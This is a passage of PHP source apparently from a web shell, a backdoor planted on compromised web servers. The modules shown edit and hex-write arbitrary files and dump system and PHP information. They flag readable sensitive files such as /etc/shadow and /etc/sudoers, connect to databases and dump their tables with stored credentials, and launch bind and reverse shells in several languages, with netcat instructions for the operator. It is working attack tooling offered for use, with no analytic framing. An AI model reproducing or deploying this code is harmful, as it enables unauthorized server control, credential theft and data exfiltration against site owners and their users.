				$s_result .= "&lt;pre style='padding: 3px 8px 0 8px;' class='viewfilecontent'&gt;";
				$s_result .=  str_replace("&lt;", "&lt;",str_replace("&gt;", "&gt;",(wordwrap(@file_get_contents($s_f),160,"\n",true))));
				$s_result .=   "&lt;/pre&gt;";
			}
		}
		elseif(@is_dir($s_f)){
			chdir($s_f);
			$s_cwd = cp(getcwd());
			setcookie("cwd", $s_cwd ,time() + $s_login_time);
			$s_result .= showdir($s_cwd);
		}
		else $s_result .= notif("Cannot find the path specified ".$s_f);

	} // edit file
	elseif(isset($_GP['edit'])){
		$s_f = $_GP['edit'];
		$s_fc = ""; $s_fcs = "";

		if(isset($_GP['new']) && ($_GP['new']=='yes')){
			$s_num = 1;
			if(@is_file($s_f)){
				$s_pos = strrpos($s_f,"_");
				if($s_pos!==false) $s_num = (int) substr($s_f,$s_pos+1);
				while(@is_file(substr($s_f,0,$s_pos)."_".$s_num)){
					$s_num++;
				}
				$s_f = substr($s_f,0,$s_pos)."_".$s_num;
			}
		}
		else if(@is_file($s_f)) $s_fc = @file_get_contents($s_f);

		if(isset($_GP['fc'])){
			$s_fc = $_GP['fc'];
			$s_eol = $_GP['eol'];
			$s_eolf = pack("H*", geol($s_fc));
			$s_eolh = pack("H*", $s_eol);
			$s_fc = str_replace($s_eolf, $s_eolh, $s_fc);

			if($s_filez = fopen($s_f,"w")){
				$s_time = @date("d-M-Y H:i:s",time());
				if(fwrite($s_filez,$s_fc)!==false) $s_fcs = "File saved @ ".$s_time;
				else $s_fcs = "Failed to save";
				fclose($s_filez);
			}
			else $s_fcs = "Permission denied";
		}
		elseif(@is_file($s_f) && !@is_writable($s_f)) $s_fcs = "This file is not writable";

		$s_eol = geol($s_fc);

		if(!empty($s_fcs)) $s_result .= notif($s_fcs);
		$s_result .= "&lt;form action='".$s_self."' method='post'&gt;
				&lt;textarea id='fc' name='fc' class='txtarea'&gt;".hss($s_fc)."&lt;/textarea&gt;
				&lt;p style='text-align:center;'&gt;&lt;input type='text' class='inputz' style='width:99%;' name='edit' value='".$s_f."' /&gt;&lt;/p&gt;
				&lt;p&gt;&lt;input type='submit' name='fcsubmit' class='inputzbut' value='Save !' style='width:120px;height:30px;' /&gt;&lt;/p&gt;
				&lt;input type='hidden' name='eol' value='".$s_eol."' /&gt;
				&lt;/form&gt;";

	} // hex edit file
	elseif(isset($_GP['hexedit'])){
		$s_f = $_GP['hexedit'];
		$s_fc = "";	$s_fcs = ""; $s_hexes = "";
		$s_lnum = 0;

		if(!empty($_GP['hexes']) || !empty($_GP['hexestxtarea'])){
			if(!empty($_GP['hexes'])){
				foreach($_GP['hexes'] as $s_hex) $s_hexes .= str_replace(" ", "", $s_hex);
			}
			elseif(!empty($_GP['hexestxtarea'])){
				$s_hexes = trim($_GP['hexestxtarea']);
			}
			if($s_filez = fopen($s_f,"w")){
					$s_bins = pack("H*", $s_hexes);
					$s_time = @date("d-M-Y H:i:s", time());
					if(fwrite($s_filez,$s_bins)!==false) $s_fcs = "File saved @ ".$s_time;
					else $s_fcs = "Failed to save";
					fclose($s_filez);
				}
			else $s_fcs = "Permission denied";
		}
		else if(@is_file($s_f) && !@is_writable($s_f)) $s_fcs = "This file is not writable";

		if(!empty($s_fcs)) $s_result .= notif($s_fcs);

		$s_result .= "&lt;form action='".$s_self."' method='post'&gt;
					&lt;p style='padding:0;text-align:center;'&gt;&lt;input type='text' class='inputz' style='width:100%;' name='hexedit' value='".$s_f."' /&gt;&lt;/p&gt;
					&lt;p class='border-bottom' style='padding:0 0 14px 0;'&gt;&lt;input type='submit' name='fcsubmit' class='inputzbut' value='Save !' style='width:120px;height:30px;' onclick=\"return submithex();\" /&gt;&lt;/p&gt;
					&lt;table class='explore'&gt;";

		if(@is_file($s_f)){
			$s_fp = fopen($s_f, "r");
			if($s_fp) {
				$s_ldump = "";
				$s_counter = 0;
				$s_icounter = 0;
				while(!feof($s_fp)){
					$s_line = fread($s_fp, 32);
					$s_linehex = strtoupper(bin2hex($s_line));
					$s_linex = str_split($s_linehex, 2);
					$s_linehex = implode(" ", $s_linex);
					$s_addr = sprintf("%08xh", $s_icounter);

					$s_result .= "&lt;tr&gt;&lt;td style='text-align:center;width:60px;'&gt;".$s_addr."&lt;/td&gt;&lt;td style='text-align:left;width:594px;'&gt;
					&lt;input onselect='this.selectionEnd=this.selectionStart;' onclick=\"hexupdate('".$s_counter."',event);\" onkeydown=\"return hexfix('".$s_counter."',event);\" onkeyup=\"hexupdate('".$s_counter."',event);\" type='text' class='inputz' id='hex_".$s_counter."' name='hexes[]' value='".$s_linehex."' style='width:578px;' maxlength='".strlen($s_linehex)."' /&gt;&lt;/td&gt;
					&lt;td style='text-align:left;letter-spacing:2px;'&gt;
					&lt;pre name='hexdump' id='dump_".$s_counter."' style='margin:0;padding:0;'&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;";
					$s_counter++;
					$s_icounter+=32;
				}
				$s_result .= "&lt;input type='hidden' id='counter' value='".$s_counter."' /&gt;";
				$s_result .= "&lt;textarea name='hexestxtarea' id='hexestxtarea' class='sembunyi'&gt;&lt;/textarea&gt;";
				fclose($s_fp);
			}
		}
		$s_result .= "&lt;/table&gt;&lt;/form&gt;";

	} // show server information
	elseif(isset($_GP['x']) && ($_GP['x']=='info')){
		$s_result = "";
		// server misc info
		$s_result .= "&lt;p class='notif' onclick=\"toggle('info_server')\"&gt;Server Info&lt;/p&gt;";
		$s_result .= "&lt;div class='info' id='info_server'&gt;&lt;table&gt;";

		if($s_win){
			foreach (range("A", "Z") as $s_letter){
				if((@is_dir($s_letter.":\\") && @is_readable($s_letter.":\\"))){
					$s_drive = $s_letter.":";
					$s_result .= "&lt;tr&gt;&lt;td&gt;drive ".$s_drive."&lt;/td&gt;&lt;td&gt;".ts(disk_free_space($s_drive))." free of ".ts(disk_total_space($s_drive))."&lt;/td&gt;&lt;/tr&gt;";
				}
			}
		}
		else $s_result .= "&lt;tr&gt;&lt;td&gt;root partition&lt;/td&gt;&lt;td&gt;".ts(@disk_free_space("/"))." free of ".ts(@disk_total_space("/"))."&lt;/td&gt;&lt;/tr&gt;";

		$s_result .= "&lt;tr&gt;&lt;td&gt;php&lt;/td&gt;&lt;td&gt;".phpversion()."&lt;/td&gt;&lt;/tr&gt;";
		$s_access = array("s_python", "s_perl", "s_ruby", "s_node", "s_gcc", "s_java", "s_tar", "s_wget", "s_lwpdownload", "s_lynx", "s_curl");
		foreach($s_access as $s){
			$s_t = explode("_", $s);
			if(isset($$s)) $s_result .= "&lt;tr&gt;&lt;td&gt;".$s_t[1]."&lt;/td&gt;&lt;td&gt;".$$s."&lt;/td&gt;&lt;/tr&gt;";
		}

		if(!$s_win){
			$s_interesting = array(
			"/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases",
			"/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf",
			"/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf",
			"/etc/ssh/sshd_config",
			"/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf",
			"/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf",
			"/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules");
			foreach($s_interesting as $s_f){
				if(@is_file($s_f) && @is_readable($s_f)) $s_result .= "&lt;tr&gt;&lt;td&gt;".$s_f."&lt;/td&gt;&lt;td&gt;&lt;a href='".$s_self."view=".$s_f."'&gt;".$s_f." is readable&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
			}
		}
		$s_result .= "&lt;/table&gt;&lt;/div&gt;";

		if(!$s_win){
			// cpu info
			if($s_i_buff=trim(@file_get_contents("/proc/cpuinfo"))){
				$s_result .= "&lt;p class='notif' onclick=\"toggle('info_cpu')\"&gt;CPU Info&lt;/p&gt;";
				$s_result .= "&lt;div class='info' id='info_cpu'&gt;";
				$s_i_buffs = explode("\n\n", $s_i_buff);
				foreach($s_i_buffs as $s_i_buffss){
					$s_i_buffss = trim($s_i_buffss);
					if($s_i_buffss!=""){
						$s_i_buffsss = explode("\n", $s_i_buffss);
						$s_result .= "&lt;table&gt;";
						foreach($s_i_buffsss as $s_i){
							$s_i = trim($s_i);
							if($s_i!=""){
								$s_ii = explode(":",$s_i);
								if(count($s_ii)==2) $s_result .= "&lt;tr&gt;&lt;td&gt;".$s_ii[0]."&lt;/td&gt;&lt;td&gt;".$s_ii[1]."&lt;/td&gt;&lt;/tr&gt;";
							}
						}
						$s_result .= "&lt;/table&gt;";
					}
				}
				$s_result .= "&lt;/div&gt;";
			}

			// mem info
			if($s_i_buff=trim(@file_get_contents("/proc/meminfo"))){
				$s_result .= "&lt;p class='notif' onclick=\"toggle('info_mem')\"&gt;Memory Info&lt;/p&gt;";
				$s_i_buffs = explode("\n", $s_i_buff);
				$s_result .= "&lt;div class='info' id='info_mem'&gt;&lt;table&gt;";
				foreach($s_i_buffs as $s_i){
					$s_i = trim($s_i);
					if($s_i!=""){
						$s_ii = explode(":",$s_i);
						if(count($s_ii)==2) $s_result .= "&lt;tr&gt;&lt;td&gt;".$s_ii[0]."&lt;/td&gt;&lt;td&gt;".$s_ii[1]."&lt;/td&gt;&lt;/tr&gt;";
					}
					else $s_result .= "&lt;/table&gt;&lt;table&gt;";
				}
				$s_result .= "&lt;/table&gt;&lt;/div&gt;";
			}

			// partition
			if($s_i_buff=trim(@file_get_contents("/proc/partitions"))){
				$s_i_buff = preg_replace("/\ +/", " ", $s_i_buff);
				$s_result .= "&lt;p class='notif' onclick=\"toggle('info_part')\"&gt;Partitions Info&lt;/p&gt;";
				$s_result .= "&lt;div class='info' id='info_part'&gt;";
				$s_i_buffs = explode("\n\n", $s_i_buff);
				$s_result .= "&lt;table&gt;&lt;tr&gt;";
				$s_i_head = explode(" ", $s_i_buffs[0]);
				foreach($s_i_head as $s_h) $s_result .= "&lt;th&gt;".$s_h."&lt;/th&gt;";
				$s_result .= "&lt;/tr&gt;";
				$s_i_buffss = explode("\n", $s_i_buffs[1]);
				foreach($s_i_buffss as $s_i_b){
					$s_i_row = explode(" ", trim($s_i_b));
					$s_result .= "&lt;tr&gt;";
					foreach($s_i_row as $s_r) $s_result .= "&lt;td style='text-align:center;'&gt;".$s_r."&lt;/td&gt;";
					$s_result .= "&lt;/tr&gt;";
				}
				$s_result .= "&lt;/table&gt;";
				$s_result .= "&lt;/div&gt;";
			}
		}
		$s_phpinfo = array("PHP General" =&gt; INFO_GENERAL, "PHP Configuration" =&gt; INFO_CONFIGURATION, "PHP Modules" =&gt; INFO_MODULES, "PHP Environment" =&gt; INFO_ENVIRONMENT, "PHP Variables" =&gt; INFO_VARIABLES);
		foreach($s_phpinfo as $s_p=&gt;$s_i){
			$s_result .= "&lt;p class='notif' onclick=\"toggle('".$s_i."')\"&gt;".$s_p."&lt;/p&gt;";
			ob_start();
			eval("phpinfo(".$s_i.");");
			$s_b = ob_get_contents();
			ob_end_clean();
			if(preg_match("/&lt;body&gt;(.*?)&lt;\/body&gt;/is", $s_b, $r)){
				$s_body = str_replace(array(",", ";", "&amp;"), array(", ", "; ", "&"), $r[1]);
				$s_result .= "&lt;div class='info' id='".$s_i."'&gt;".$s_body."&lt;/div&gt;";
			}
		}
	} // working with database
	elseif(isset($_GP['x']) && ($_GP['x']=='db')){
		// sqltype : mysql, mssql, oracle, pgsql, sqlite, sqlite3, odbc, pdo
		$s_sql = array();
		$s_sql_deleted = "";
		$s_show_form = $s_show_dbs = true;

		if(isset($_GP['dc'])){
			$k = $_GP['dc'];
			setcookie("c[".$k."]", "" ,time() - $s_login_time);
			$s_sql_deleted = $k;
		}

		if(isset($_COOKIE['c']) && !isset($_GP['connect'])){
			foreach($_COOKIE['c'] as $c=&gt;$d){
				if($c==$s_sql_deleted) continue;
				$s_dbcon = (function_exists("json_encode") && function_exists("json_decode"))? json_decode($d):unserialize($d);
				foreach($s_dbcon as $k=&gt;$v) $s_sql[$k] = $v;
				$s_sqlport = (!empty($s_sql['port']))? ":".$s_sql['port']:"";
				$s_result .= notif("[".$s_sql['type']."] ".$s_sql['user']."@".$s_sql['host'].$s_sqlport."
							&lt;span style='float:right;'&gt;&lt;a href='".$s_self."x=db&connect=connect&sqlhost=".$s_sql['host']."&sqlport=".$s_sql['port']."&sqluser=".$s_sql['user']."&sqlpass=".$s_sql['pass']."&sqltype=".$s_sql['type']."'&gt;connect&lt;/a&gt; | &lt;a href='".$s_self."x=db&dc=".$c."'&gt;disconnect&lt;/a&gt;&lt;/span&gt;");
			}
		}
		else{
			$s_sql['host'] = isset($_GP['sqlhost'])? $_GP['sqlhost'] : "";
			$s_sql['port'] = isset($_GP['sqlport'])? $_GP['sqlport'] : "";
			$s_sql['user'] = isset($_GP['sqluser'])? $_GP['sqluser'] : "";
			$s_sql['pass'] = isset($_GP['sqlpass'])? $_GP['sqlpass'] : "";
			$s_sql['type'] = isset($_GP['sqltype'])? $_GP['sqltype'] : "";
		}

		if(isset($_GP['connect'])){
			$s_con = sql_connect($s_sql['type'],$s_sql['host'],$s_sql['user'],$s_sql['pass']);
			$s_sqlcode = isset($_GP['sqlcode'])? $_GP['sqlcode'] : "";

			if($s_con!==false){
				if(isset($_GP['sqlinit'])){
					$s_sql_cookie = (function_exists("json_encode") && function_exists("json_decode"))? json_encode($s_sql):serialize($s_sql);
					$s_c_num = substr(md5(time().rand(0,100)),0,3);
					while(isset($_COOKIE['c']) && is_array($_COOKIE['c']) && array_key_exists($s_c_num, $_COOKIE['c'])){
						$s_c_num = substr(md5(time().rand(0,100)),0,3);
					}
					setcookie("c[".$s_c_num."]", $s_sql_cookie ,time() + $s_login_time);
				}
				$s_show_form = false;
				$s_result .= "&lt;form action='".$s_self."' method='post'&gt;
					&lt;input type='hidden' name='sqlhost' value='".$s_sql['host']."' /&gt;
					&lt;input type='hidden' name='sqlport' value='".$s_sql['port']."' /&gt;
					&lt;input type='hidden' name='sqluser' value='".$s_sql['user']."' /&gt;
					&lt;input type='hidden' name='sqlpass' value='".$s_sql['pass']."' /&gt;
					&lt;input type='hidden' name='sqltype' value='".$s_sql['type']."' /&gt;
					&lt;input type='hidden' name='x' value='db' /&gt;
					&lt;input type='hidden' name='connect' value='connect' /&gt;
					&lt;textarea id='sqlcode' name='sqlcode' class='txtarea' style='height:150px;'&gt;".hss($s_sqlcode)."&lt;/textarea&gt;
					&lt;p&gt;&lt;input type='submit' name='gogo' class='inputzbut' value='Go !' style='width:120px;height:30px;' /&gt;
					&nbsp;&nbsp;Separate multiple commands with a semicolon  &lt;span class='gaya'&gt;[&lt;/span&gt; ; &lt;span class='gaya'&gt;]&lt;/span&gt;&lt;/p&gt;
					&lt;/form&gt;";

				if(!empty($s_sqlcode)){
					$s_querys = explode(";",$s_sqlcode);
					foreach($s_querys as $s_query){
						if(trim($s_query) != ""){
							$s_hasil = sql_query($s_sql['type'],$s_query,$s_con);
							if($s_hasil!=false){
								$s_result .= "&lt;hr /&gt;&lt;p style='padding:0;margin:6px 10px;font-weight:bold;'&gt;".hss($s_query).";&nbsp;&nbsp;&nbsp;
								&lt;span class='gaya'&gt;[&lt;/span&gt; ok &lt;span class='gaya'&gt;]&lt;/span&gt;&lt;/p&gt;";

								if(!is_bool($s_hasil)){
									$s_result .= "&lt;table class='explore sortable' style='width:100%;'&gt;&lt;tr&gt;";
									for($s_i = 0; $s_i&lt;sql_num_fields($s_sql['type'],$s_hasil); $s_i++)
										$s_result .= "&lt;th&gt;".@hss(sql_field_name($s_sql['type'],$s_hasil,$s_i))."&lt;/th&gt;";
									$s_result .= "&lt;/tr&gt;";
									while($s_rows=sql_fetch_data($s_sql['type'],$s_hasil)){
										$s_result .= "&lt;tr&gt;";
										foreach($s_rows as $s_r){
											if(empty($s_r)) $s_r = " ";
											$s_result .= "&lt;td&gt;".@hss($s_r)."&lt;/td&gt;";
										}
										$s_result .= "&lt;/tr&gt;";
									}
									$s_result .= "&lt;/table&gt;";
								}
							}
							else{
								$s_result .= "&lt;p style='padding:0;margin:6px 10px;font-weight:bold;'&gt;".hss($s_query).";&nbsp;&nbsp;&nbsp;&lt;span class='gaya'&gt;[&lt;/span&gt; error &lt;span class='gaya'&gt;]&lt;/span&gt;&lt;/p&gt;";
							}
						}
					}
				}
				else{
					if(($s_sql['type']!='pdo') && ($s_sql['type']!='odbc')){
						if($s_sql['type']=='mysql') $s_showdb = "SHOW DATABASES";
						elseif($s_sql['type']=='mssql') $s_showdb = "SELECT name FROM master..sysdatabases";
						elseif($s_sql['type']=='pgsql') $s_showdb = "SELECT schema_name FROM information_schema.schemata";
						elseif($s_sql['type']=='oracle') $s_showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME";
						elseif($s_sql['type']=='sqlite3' || $s_sql['type']=='sqlite') $s_showdb = "SELECT \"".$s_sql['host']."\"";
						else $s_showdb = "SHOW DATABASES";

						$s_hasil = sql_query($s_sql['type'],$s_showdb,$s_con);

						if($s_hasil!=false) {
							while($s_rows_arr=sql_fetch_data($s_sql['type'],$s_hasil)){
								foreach($s_rows_arr as $s_rows){
									$s_result .= "&lt;p class='notif' onclick=\"toggle('db_".$s_rows."')\"&gt;".$s_rows."&lt;/p&gt;";
									$s_result .= "&lt;div class='info' id='db_".$s_rows."'&gt;&lt;table class='explore'&gt;";

									if($s_sql['type']=='mysql') $s_showtbl = "SHOW TABLES FROM ".$s_rows;
									elseif($s_sql['type']=='mssql') $s_showtbl = "SELECT name FROM ".$s_rows."..sysobjects WHERE xtype = 'U'";
									elseif($s_sql['type']=='pgsql') $s_showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$s_rows."'";
									elseif($s_sql['type']=='oracle') $s_showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$s_rows."'";
									elseif($s_sql['type']=='sqlite3' || $s_sql['type']=='sqlite') $s_showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
									else $s_showtbl = "";

									$s_hasil_t = sql_query($s_sql['type'],$s_showtbl,$s_con);
									if($s_hasil_t!=false) {
										while($s_tables_arr=sql_fetch_data($s_sql['type'],$s_hasil_t)){
											foreach($s_tables_arr as $s_tables){
												if($s_sql['type']=='mysql') $s_dump_tbl = "SELECT * FROM ".$s_rows.".".$s_tables." LIMIT 0,100";
												elseif($s_sql['type']=='mssql') $s_dump_tbl = "SELECT TOP 100 * FROM ".$s_rows."..".$s_tables;
												elseif($s_sql['type']=='pgsql') $s_dump_tbl = "SELECT * FROM ".$s_rows.".".$s_tables." LIMIT 100 OFFSET 0";
												elseif($s_sql['type']=='oracle') $s_dump_tbl = "SELECT * FROM ".$s_rows.".".$s_tables." WHERE ROWNUM BETWEEN 0 AND 100;";
												elseif($s_sql['type']=='sqlite' || $s_sql['type']=='sqlite3') $s_dump_tbl = "SELECT * FROM ".$s_tables." LIMIT 0,100";
												else $s_dump_tbl = "";

												$s_dump_tbl_link = $s_self."x=db&connect=&sqlhost=".$s_sql['host']."&sqlport=".$s_sql['port']."&sqluser=".$s_sql['user']."&sqlpass=".$s_sql['pass']."&sqltype=".$s_sql['type']."&sqlcode=".$s_dump_tbl;

												$s_result .= "&lt;tr&gt;&lt;td ondblclick=\"return go('".adds($s_dump_tbl_link)."',event);\"&gt;&lt;a href='".$s_dump_tbl_link."'&gt;".$s_tables."&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
											}
										}
									}
									$s_result .= "&lt;/table&gt;&lt;/div&gt;";
								}
							}
						}
					}
				}
				sql_close($s_sql['type'],$s_con);
			}
			else{
				$s_result .= notif("Unable to connect to database");
				$s_show_form = true;
			}
		}

		if($s_show_form){
			// sqltype : mysql, mssql, oracle, pgsql, sqlite, sqlite3, odbc, pdo
			$s_sqllist = array();
			if(function_exists("mysql_connect")) $s_sqllist["mysql"] = "connect to MySQL &lt;span class='desc' style='font-size:12px;'&gt;- using mysql_*&lt;/span&gt;";
			if(function_exists("mssql_connect") || function_exists("sqlsrv_connect")) $s_sqllist["mssql"] = "connect to MsSQL &lt;span class='desc' style='font-size:12px;'&gt;- using mssql_* or sqlsrv_*&lt;/span&gt;";
			if(function_exists("pg_connect")) $s_sqllist["pgsql"] = "connect to PostgreSQL &lt;span class='desc' style='font-size:12px;'&gt;- using pg_*&lt;/span&gt;";
			if(function_exists("oci_connect")) $s_sqllist["oracle"] = "connect to oracle &lt;span class='desc' style='font-size:12px;'&gt;- using oci_*&lt;/span&gt;";
			if(function_exists("sqlite_open")) $s_sqllist["sqlite"] = "connect to SQLite &lt;span class='desc' style='font-size:12px;'&gt;- using sqlite_*&lt;/span&gt;";
			if(class_exists("SQLite3")) $s_sqllist["sqlite3"] = "connect to SQLite3 &lt;span class='desc' style='font-size:12px;'&gt;- using class SQLite3&lt;/span&gt;";
			if(function_exists("odbc_connect")) $s_sqllist["odbc"] = "connect via ODBC &lt;span class='desc' style='font-size:12px;'&gt;- using odbc_*&lt;/span&gt;";
			if(class_exists("PDO")) $s_sqllist["pdo"] = "connect via PDO &lt;span class='desc' style='font-size:12px;'&gt;- using class PDO&lt;/span&gt;";

			foreach($s_sqllist as $s_sql['type']=&gt;$s_sqltitle){
				if($s_sql['type']=="odbc" || $s_sql['type']=="pdo"){
					$s_result .= "&lt;div class='mybox'&gt;&lt;h2&gt;".$s_sqltitle."&lt;/h2&gt;
					&lt;form action='".$s_self."' method='post' /&gt;
					&lt;table class='myboxtbl'&gt;
					&lt;tr&gt;&lt;td style='width:170px;'&gt;DSN / Connection String&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
					&lt;tr&gt;&lt;td&gt;Username&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='sqluser' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
					&lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
					&lt;/table&gt;
					&lt;input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' /&gt;
					&lt;input type='hidden' name='sqltype' value='".$s_sql['type']."' /&gt;
					&lt;input type='hidden' name='sqlinit' value='init' /&gt;
					&lt;input type='hidden' name='x' value='db' /&gt;
					&lt;/form&gt;
					&lt;/div&gt;";
				}
				elseif($s_sql['type']=="sqlite" || $s_sql['type']=="sqlite3"){
					$s_result .= "&lt;div class='mybox'&gt;&lt;h2&gt;".$s_sqltitle."&lt;/h2&gt;
					&lt;form action='".$s_self."' method='post' /&gt;
					&lt;table class='myboxtbl'&gt;
					&lt;tr&gt;&lt;td style='width:170px;'&gt;DB File&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
					&lt;/table&gt;
					&lt;input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' /&gt;
					&lt;input type='hidden' name='sqltype' value='".$s_sql['type']."' /&gt;
					&lt;input type='hidden' name='sqlinit' value='init' /&gt;
					&lt;input type='hidden' name='x' value='db' /&gt;
					&lt;/form&gt;
					&lt;/div&gt;";
				}
				else{
					$s_result .= "&lt;div class='mybox'&gt;&lt;h2&gt;".$s_sqltitle."&lt;/h2&gt;
					&lt;form action='".$s_self."' method='post' /&gt;
					&lt;table class='myboxtbl'&gt;
					&lt;tr&gt;&lt;td style='width:170px;'&gt;Host&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
					&lt;tr&gt;&lt;td&gt;Username&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='sqluser' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
					&lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
					&lt;tr&gt;&lt;td&gt;Port (optional)&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='sqlport' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
					&lt;/table&gt;
					&lt;input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' /&gt;
					&lt;input type='hidden' name='sqltype' value='".$s_sql['type']."' /&gt;
					&lt;input type='hidden' name='sqlinit' value='init' /&gt;
					&lt;input type='hidden' name='x' value='db' /&gt;
					&lt;/form&gt;
					&lt;/div&gt;";
				}
			}
		}
	} // bind and reverse shell
	elseif(isset($_GP['x']) && ($_GP['x']=='rs')){
		// resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php
		$s_rshost = $s_server_ip;

		$s_rsport = "13123"; // default port
		$s_rspesana = "Press &#39;  Go !  &#39; button and run &#39;  nc &lt;i&gt;server_ip&lt;/i&gt; &lt;i&gt;port&lt;/i&gt;  &#39; on your computer";
		$s_rspesanb = "Run &#39;  nc -l -v -p &lt;i&gt;port&lt;/i&gt;  &#39; on your computer and press &#39;  Go !  &#39; button";
		$s_rs_err = "";

		$s_rsbind = $s_rsback = array();

		$s_rsbind["bind_php"] = "Bind Shell &lt;span class='desc' style='font-size:12px;'&gt;- php&lt;/span&gt;";
		$s_rsback["back_php"] = "Reverse Shell &lt;span class='desc' style='font-size:12px;'&gt;- php&lt;/span&gt;";

		$s_access = array("s_python"=&gt;"py", "s_perl"=&gt;"pl", "s_ruby"=&gt;"rb", "s_node"=&gt;"js", "s_gcc"=&gt;"c", "s_java"=&gt;"java");
		foreach($s_access as $k=&gt;$v){
			if(isset($$k)){
				$s_t = explode("_", $k);
				$s_rsbind["bind_".$v] = "Bind Shell &lt;span class='desc' style='font-size:12px;'&gt;- ".$s_t[1]."&lt;/span&gt;";
				$s_rsback["back_".$v] = "Reverse Shell &lt;span class='desc' style='font-size:12px;'&gt;- ".$s_t[1]."&lt;/span&gt;";
			}
		}

		if($s_win){
			$s_rsbind["bind_win"] = "Bind Shell &lt;span class='desc' style='font-size:12px;'&gt;- windows executable&lt;/span&gt;";
			$s_rsback["back_win"] = "Reverse Shell &lt;span class='desc' style='font-size:12px;'&gt;- windows executable&lt;/span&gt;";
		}
		$s_rslist = array_merge($s_rsbind,$s_rsback);

		if(!@is_writable($s_cwd)) $s_result .= notif("Directory ".$s_cwd." is not writable, please change to a writable one");

		foreach($s_rslist as $s_rstype=&gt;$s_rstitle){
			$s_split = explode("_",$s_rstype);
			if($s_split[0]=="bind"){
				$s_rspesan = $s_rspesana;
				$s_rsdisabled = "disabled='disabled'";
				$s_rstarget = $s_server_ip;
				$s_labelip = "Server IP";
			}
			elseif($s_split[0]=="back"){
				$s_rspesan = $s_rspesanb;
				$s_rsdisabled = "";
				$s_rstarget = $s_my_ip;
				$s_labelip = "Target IP";
			}

			if(isset($_GP[$s_rstype])){
				if(isset($_GP["rshost_".$s_rstype])) $s_rshost_ = $_GP["rshost_".$s_rstype];
				if(isset($_GP["rsport_".$s_rstype])) $s_rsport_ = $_GP["rsport_".$s_rstype];

				if($s_split[0]=="bind") $s_rstarget_packed = $s_rsport_;
				elseif($s_split[0]=="back") $s_rstarget_packed = $s_rsport_." ".$s_rshost_;

				if($s_split[1]=="pl") $s_rscode = $s_rs_pl;
				elseif($s_split[1]=="py") $s_rscode = $s_rs_py;
				elseif($s_split[1]=="rb") $s_rscode = $s_rs_rb;
				elseif($s_split[1]=="js") $s_rscode = $s_rs_js;
				elseif($s_split[1]=="c") $s_rscode = $s_rs_c;
				elseif($s_split[1]=="java") $s_rscode = $s_rs_java;
				elseif($s_split[1]=="win") $s_rscode = $s_rs_win;
				elseif($s_split[1]=="php") $s_rscode = $s_rs_php;

				$s_buff = rs($s_rstype,$s_rstarget_packed,$s_rscode);
				if($s_buff!="") $s_rs_err = notif(hss($s_buff));
			}
			$s_result .= "&lt;div class='mybox'&gt;&lt;h2&gt;".$s_rstitle."&lt;/h2&gt;
			&lt;form action='".$s_self."' method='post' /&gt;
			&lt;table class='myboxtbl'&gt;
			&lt;tr&gt;&lt;td style='width:100px;'&gt;".$s_labelip."&lt;/td&gt;&lt;td&gt;&lt;input ".$s_rsdisabled." style='width:100%;' class='inputz' type='text' name='rshost_".$s_rstype."' value='".$s_rstarget."' /&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='rsport_".$s_rstype."' value='".$s_rsport."' /&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;/table&gt;
			&lt;input type='submit' name='".$s_rstype."' class='inputzbut' value='Go !' style='width:120px;height:30px;margin:10px 2px 0 2px;' /&gt;
			&nbsp;&nbsp;&lt;span&gt;".$s_rspesan."&lt;/span&gt;
			&lt;input type='hidden' name='x' value='rs' /&gt;
			&lt;/form&gt;
			&lt;/div&gt;";
		}
		$s_result = $s_rs_err.$s_result;
	} // task manager
